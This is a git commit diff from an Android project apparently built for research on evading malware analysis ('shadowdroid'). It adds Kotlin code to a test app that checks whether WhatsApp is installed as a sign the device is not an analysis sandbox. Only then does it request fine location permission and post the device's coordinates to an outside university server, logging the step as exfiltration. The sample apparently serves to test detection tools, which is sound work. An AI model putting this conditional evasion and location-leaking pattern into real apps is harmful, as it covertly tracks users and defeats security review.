0f41916f142a756f7389e3451f6bb0f6b823567d
Timme Bethe <timme@timmebethe.nl>
2021-06-03 11:09:26 +0200

    Implemented actual leaking in WhatsAppInstalled
    - Updated all dependencies
    - Added leaking location

--- conditional-leaking/WhatsAppInstalled/app/src/main/java/nl/tbethe/shadowdroid/whatsappinstalled/MainActivity.kt
+++ conditional-leaking/WhatsAppInstalled/app/src/main/java/nl/tbethe/shadowdroid/whatsappinstalled/MainActivity.kt
@@ -1,10 +1,22 @@
 package nl.tbethe.shadowdroid.whatsappinstalled
 
+import android.Manifest
 import android.content.pm.PackageManager
+import android.location.Criteria
+import android.location.LocationManager
 import android.os.Build
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
+import androidx.activity.result.contract.ActivityResultContracts
+import io.ktor.client.*
+import io.ktor.client.engine.cio.*
+import io.ktor.client.request.forms.*
+import io.ktor.client.statement.*
+import io.ktor.http.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 private const val TAG = "MainActivity"
 
@@ -26,9 +38,52 @@ class MainActivity : AppCompatActivity() {
             Log.d(TAG, "Won't be leaking data")
         }
 
-        if (waInstalled) {
-            Log.d(TAG, "Leaking data...")
-            TODO("Leak data")
+        leakLocationIf(waInstalled)
+    }
+
+    private fun leakLocationIf(notAnalyser: Boolean) {
+        if (!notAnalyser) return
+
+        fun sendLocation() {
+            val lm = getSystemService(LocationManager::class.java)
+            val provider = lm.getBestProvider(Criteria(), true)
+
+            val location = provider?.let {
+                lm.getLastKnownLocation(it)
+            }
+            location?.let { loc ->
+                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak?appname="
+                CoroutineScope(Dispatchers.IO).launch {
+                    try {
+                        HttpClient(CIO).use { client ->
+                            val response = client.submitForm<HttpResponse>(
+                                url,
+                                Parameters.build {
+                                    append("appname", packageName)
+                                    append("coords", "${loc.latitude}:${loc.longitude}")
+                                },
+                                false
+                            )
+                            Log.d(TAG, "Response status: ${response.status}")
+                            Log.d(TAG, "Response: ${response.readText()}")
+                        }
+                    } catch (e: Exception) {
+                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
+                    }
+                }
+            }
+        }
+        val requestPermission =
+            registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
+                if (isGranted) sendLocation()
+            }
+        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+            PackageManager.PERMISSION_DENIED -> {
+                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
+            }
+            PackageManager.PERMISSION_GRANTED -> {
+                sendLocation()
+            }
         }
     }
 }
